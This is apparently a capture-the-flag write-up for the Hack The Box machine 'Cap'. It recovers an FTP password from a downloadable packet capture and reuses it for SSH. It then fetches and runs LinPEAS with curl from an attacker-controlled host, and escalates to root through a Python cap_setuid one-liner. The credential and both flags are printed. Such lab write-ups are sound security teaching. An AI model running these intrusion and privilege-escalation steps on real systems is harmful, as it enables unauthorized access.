## ------------>> Cap <<--------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.245 -p-
-----

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-07 06:07 UTC
    Stats: 0:15:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.51% done; ETC: 06:22 (0:00:00 remaining)
    Nmap scan report for 10.10.10.245
    Host is up (0.30s latency).
    Not shown: 65521 closed ports
    PORT      STATE    SERVICE          VERSION
    21/tcp    open     ftp              vsftpd 3.0.3
    22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
    |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
    |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
    80/tcp    open     http             gunicorn
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.0 404 NOT FOUND
    |     Server: gunicorn
    |     Date: Sat, 07 Aug 2021 06:21:59 GMT
    |     Connection: close
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 232
    |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
    |     <title>404 Not Found</title>
    |     <h1>Not Found</h1>
    |     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
    |   GetRequest: 
    |     HTTP/1.0 200 OK
    |     Server: gunicorn
    |     Date: Sat, 07 Aug 2021 06:21:52 GMT
    |     Connection: close
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 19386
    |     <!DOCTYPE html>
    |     <html class="no-js" lang="en">
    |     <head>
    |     <meta charset="utf-8">
    |     <meta http-equiv="x-ua-compatible" content="ie=edge">
    |     <title>Security Dashboard</title>
    |     <meta name="viewport" content="width=device-width, initial-scale=1">
    |     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
    |     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    |     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
    |     <link rel="stylesheet" href="/static/css/themify-icons.css">
    |     <link rel="stylesheet" href="/static/css/metisMenu.css">
    |     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
    |     <link rel="stylesheet" href="/static/css/slicknav.min.css">
    |     <!-- amchar
    |   HTTPOptions: 
    |     HTTP/1.0 200 OK
    |     Server: gunicorn
    |     Date: Sat, 07 Aug 2021 06:21:53 GMT
    |     Connection: close
    |     Content-Type: text/html; charset=utf-8
    |     Allow: HEAD, GET, OPTIONS
    |     Content-Length: 0
    |   RTSPRequest: 
    |     HTTP/1.1 400 Bad Request
    |     Connection: close
    |     Content-Type: text/html
    |     Content-Length: 196
    |     <html>
    |     <head>
    |     <title>Bad Request</title>
    |     </head>
    |     <body>
    |     <h1><p>Bad Request</p></h1>
    |     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
    |     </body>
    |_    </html>
    |_http-server-header: gunicorn
    |_http-title: Security Dashboard
    10000/tcp filtered snet-sensor-mgmt
    14568/tcp filtered unknown
    23192/tcp filtered unknown
    27188/tcp filtered unknown
    30770/tcp filtered unknown
    31626/tcp filtered unknown
    36496/tcp filtered unknown
    38717/tcp filtered unknown
    42666/tcp filtered unknown
    58716/tcp filtered unknown
    65119/tcp filtered unknown

// Nvigatin to http://10.10.10.245/ , we presented with security deshboard that possibly monitor the network (kind of SIEM)

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cap/1.png)

// Lets search some directories with [FeroxBuster](https://github.com/epi052/feroxbuster) tool by epi052.

    $ ./feroxbuster -u http://10.10.10.245/ -w /usr/share/dirb/wordlists/big.txt -t 100
-------

     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.245/
     🚀  Threads               │ 100
     📖  Wordlist              │ /usr/share/dirb/wordlists/big.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    302        4l       24w      208c http://10.10.10.245/data
    302        4l       24w      220c http://10.10.10.245/capture
    200      355l     1055w    17450c http://10.10.10.245/ip
    200      547l     2981w    40784c http://10.10.10.245/netstat
    [####################] - 33s    20468/20468   0s      found:4       errors:0      
    [####################] - 33s    20468/20468   615/s   http://10.10.10.245/

// Navigating to http://10.10.10.245/data redirects us to http://10.10.10.245/data/1 

// And its the same direction when clicking the 'Security Snapshoot' tab.

// As written that options enables to capture packages on the network for 5sec.

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cap/2.png)

// Lets try to Brute Force the directories with BurpSuite Intruder

// First make wordlist with 'crunch' (filters(1 3)-from 1 digit to 3, containt only '0123456789')

    $ crunch 1 3 0123456789 > 100.txt
-----
![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cap/3.png)
![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cap/4.png)

// Focus on 200 status we get from the attack our result: 0, 1, 2, 4, 5, 11, 12, 14, 15

// Navigate to all camptures, the one waz exluded lead me to http://10.10.10.245/data/0 , and download the capture

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cap/5.png)

// Since the file is .pcap we can open it with WireShark , Filter (Ctrl+f , search: 'String' : "pass" )

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cap/6.png)

// We found FTP packet with Password !

    PASS Buck3tH4TF0RM3!

// Lets try connect to SSH since we got ssh service open the user 'nathan' from the website and the password

    nathan@cap:~$ id
    uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

// It worked !!

// And we got user flag!

    nathan@cap:~$ cat user.txt
    793451.........................


### ---------Privilleges Escalation----------

// First lets run [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)(By carlospolop) PrivEsc Tool for linux to enumerate our options.

// Upload LinPEAS via python http server

    $ python3 -m http.server 1445
    
// now Download the file on target with curl

    nathan@cap:~$ curl http://10.10.17.8:1445/linpeas.sh --output linpeas.sh

      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  445k  100  445k    0     0   186k      0  0:00:02  0:00:02 --:--:--  185k

    nathan@cap:~$ chmod +x linpeas.sh 
    nathan@cap:~$ ./linpeas.sh 

.....

    ╔══════════╣ Capabilities

    Files with capabilities (limited to 50):
    /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
    /usr/bin/ping = cap_net_raw+ep
    /usr/bin/traceroute6.iputils = cap_net_raw+ep
    /usr/bin/mtr-packet = cap_net_raw+ep
    /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

.....

// We can see that we have python3.8 installed on system

// Check 

    nathan@cap:~$ which python3.8
    /usr/bin/python3.8

// Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) Python Capabilities

// From GTFBins: """ If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set,

    /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

// it can be used as a backdoor to maintain privileged access by manipulating its own process UID """

    nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
    # whoami
    root

// And we got flag !!

    # cat /root/root.txt
    3f1c275015b75f596238c1085ccedd98



